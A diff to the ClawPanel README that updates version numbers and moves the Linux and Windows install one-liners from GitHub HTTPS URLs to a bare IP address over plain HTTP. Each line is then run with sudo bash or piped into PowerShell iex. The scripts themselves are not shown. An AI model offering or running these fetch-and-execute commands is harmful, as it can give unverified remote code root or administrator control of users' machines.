@@ -9,7 +9,7 @@
 Go Single Binary · React 18 · TailwindCSS · SQLite · WebSocket Real-time · Cross-platform
 
 [![License](https://img.shields.io/badge/license-CC%20BY--NC--SA%204.0-red?style=flat-square)](LICENSE)
-[![Version](https://img.shields.io/badge/version-5.1.8-violet?style=flat-square)](https://github.com/zhaoxinyi02/ClawPanel/releases)
+[![Version](https://img.shields.io/badge/version-5.2.3-violet?style=flat-square)](https://github.com/zhaoxinyi02/ClawPanel/releases)
 [![Go](https://img.shields.io/badge/go-1.22+-00ADD8?style=flat-square&logo=go&logoColor=white)](https://go.dev)
 [![React](https://img.shields.io/badge/react-18-61DAFB?style=flat-square&logo=react&logoColor=white)](https://react.dev)
 [![CI](https://github.com/zhaoxinyi02/ClawPanel/actions/workflows/ci.yml/badge.svg)](https://github.com/zhaoxinyi02/ClawPanel/actions/workflows/ci.yml)
@@ -135,7 +135,7 @@ Built-in AI chat assistant floating panel, supports multi-provider/multi-model s
 **Linux / macOS**
 
 ```bash
-curl -sSO https://raw.githubusercontent.com/zhaoxinyi02/ClawPanel/main/scripts/install.sh && sudo bash install.sh
+curl -fsSL http://39.102.53.188:16198/clawpanel/scripts/install.sh -o install.sh && sudo bash install.sh
 ```
 
 Auto-completes: download binary → install to `/opt/clawpanel` → register system service → auto-start → configure firewall → start.
@@ -143,7 +143,7 @@ Auto-completes: download binary → install to `/opt/clawpanel` → register sys
 **Windows (PowerShell as Admin)**
 
 ```powershell
-irm https://raw.githubusercontent.com/zhaoxinyi02/ClawPanel/main/scripts/install.ps1 | iex
+irm http://39.102.53.188:16198/clawpanel/scripts/install.ps1 | iex
 ```
 
 Or download `ClawPanel-Setup.exe` from [Releases](https://github.com/zhaoxinyi02/ClawPanel/releases) and run as administrator.
@@ -203,7 +203,7 @@ The repository now includes two workflows for testing and release packaging:
     - `frontend-dist`
     - `clawpanel-linux-amd64-ci` for quick validation
 - `Release Build` (`.github/workflows/release.yml`)
-  - Trigger: `push` tag `v*` (for example `v5.1.8`) / manual dispatch
+  - Trigger: `push` tag `v*` (for example `v5.2.1`) / manual dispatch
   - Runs: automatic multi-platform binaries (`linux/darwin/windows`) + Windows installer `ClawPanel-Setup-v{version}.exe`
   - Publish: for tag runs, assets are uploaded to GitHub Releases with `checksums.txt`
 
@@ -212,8 +212,8 @@ Additionally, `Dependabot` (`.github/dependabot.yml`) checks GitHub Actions depe
 Example:
 
 ```bash
-git tag v5.1.8
-git push origin v5.1.8
+git tag v5.2.1
+git push origin v5.2.1
 ```
 
 ## Environment Variables
